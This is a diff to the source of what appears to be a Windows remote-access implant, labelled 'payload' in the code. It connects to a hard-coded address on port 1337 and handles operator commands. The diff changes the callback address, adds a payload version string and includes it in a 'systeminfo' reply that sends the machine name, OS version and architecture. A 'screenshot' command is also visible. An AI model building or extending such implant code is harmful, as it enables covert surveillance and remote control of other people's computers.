@@ -4,8 +4,9 @@
 #define WIN32_LEAN_AND_MEAN
 #endif
 
-// #define ADDRESS "127.0.0.1"
-#define ADDRESS "192.168.1.37"
+#define PAYLOAD_VERSION "Windows v1.0.0"
+#define ADDRESS "127.0.0.1"
+// #define ADDRESS "192.168.1.37"
 #define PORT 1337
 
 #include <winsock2.h>
@@ -61,13 +62,14 @@ void handle(char *buff, BOOL *listen, BOOL *loop) {
 
   } else if (cmd == "systeminfo") {
     char str[256];
-    sprintf(str, "{\"name\": \"%s\", \"version\": \"%d.%d b.%d\", \"os\": \"%s\", \"arch\": %d}",
+    sprintf(str, "{\"systeminfo\": {\"name\": \"%s\", \"version\": \"%d.%d b.%d\", \"os\": \"%s\", \"arch\": %d, \"payload\": \"%s\"}}",
         fingerprint::getMachineName(),
         info.dwMajorVersion,
         info.dwMinorVersion,
         info.dwBuildNumber,
         ID,
-        fingerprint::is64bits() ? 64 : 32);
+        fingerprint::is64bits() ? 64 : 32,
+        PAYLOAD_VERSION);
     net::write(&sock, str);
 
   } else if (cmd == "screenshot") {
